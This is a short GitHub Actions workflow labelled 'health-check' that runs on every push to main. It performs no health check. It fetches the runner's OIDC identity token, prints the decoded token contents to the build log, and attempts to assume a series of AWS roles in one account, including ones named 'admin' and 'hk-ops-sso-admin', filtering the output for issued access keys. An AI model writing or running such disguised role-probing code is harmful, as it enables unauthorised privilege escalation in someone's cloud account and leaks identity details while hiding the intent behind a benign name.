name: health-check
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC Token
        run: |
          # Get raw OIDC token from GitHub
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
          
          # Decode JWT payload (no verification needed - just inspect)
          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null || echo "$TOKEN" | cut -d. -f2 | base64 --decode 2>/dev/null)
          echo "=== JWT PAYLOAD ==="
          echo "$PAYLOAD" | jq . 2>/dev/null || echo "$PAYLOAD"
          
          echo ""
          echo "=== ASSUME ROLE ATTEMPT ==="
          # Try assume role manually with detailed error
          aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::757278738533:role/hk-github-deploy" \
            --role-session-name "recover" \
            --web-identity-token "$TOKEN" \
            --region us-east-1 2>&1 || true
          
          echo ""
          echo "=== TRY OTHER ROLES ==="
          for ROLE in hk-cross-account-ops hk-ops-sso-admin admin; do
            echo -n "Role $ROLE: "
            aws sts assume-role-with-web-identity \
              --role-arn "arn:aws:iam::757278738533:role/$ROLE" \
              --role-session-name "recover" \
              --web-identity-token "$TOKEN" \
              --region us-east-1 2>&1 | grep -oP '(error|Error|AccessKeyId).*' | head -1
          done
